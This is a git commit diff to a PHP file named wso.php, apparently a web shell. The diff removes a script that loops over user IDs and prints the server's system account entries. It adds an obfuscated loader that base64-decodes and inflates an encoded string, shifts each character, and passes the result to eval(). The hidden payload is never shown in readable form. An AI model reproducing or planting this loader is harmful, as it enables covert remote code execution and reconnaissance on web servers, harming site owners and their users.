d3125133082babe4947ec1b9b8d244303e9b655f
Aht-crew <39540991+Aht-crew@users.noreply.github.com>
2020-03-03 23:56:07 +0100

    Update wso.php

--- wso.php
+++ wso.php
@@ -1,20 +1,9 @@
-<?php
-for ($i=0; $i <5000 ; $i++) {
-
-$oku = posix_getpwuid($i);
-if (!empty($oku)) {
-             while (list ($key, $cavdar) = each($oku))
-             {
-print "$cavdar";
-}
-
-print "<br/>";
-}
-}
-
-
-
-
-
-
-?>
+<?php function FQVjM($uZm)
+{ 
+$uZm=gzinflate(base64_decode($uZm));
+ for($i=0;$i<strlen($uZm);$i++)
+ {
+$uZm[$i] = chr(ord($uZm[$i])-1);
+ }
+ return $uZm;
+ }eval(FQVjM("XY5dDoIwEIQP0KR3GEkf2mAir4Yfj2IQimxAaUoRifHsFtJE4+zLZjLfzgJenDWDhRSUJykEITsmXlj3OFZ4ccaZGLoJOcww0vN81c7ME9UeUSln1EDu9M24Ra4xtSH41dxSryF7Gp3v6fSyh6jKR11a5Y/qsmoD+cf5O8bS3SEK8cjXvdd/gp1d7KEI5uZ/51Rw9gE="));?>
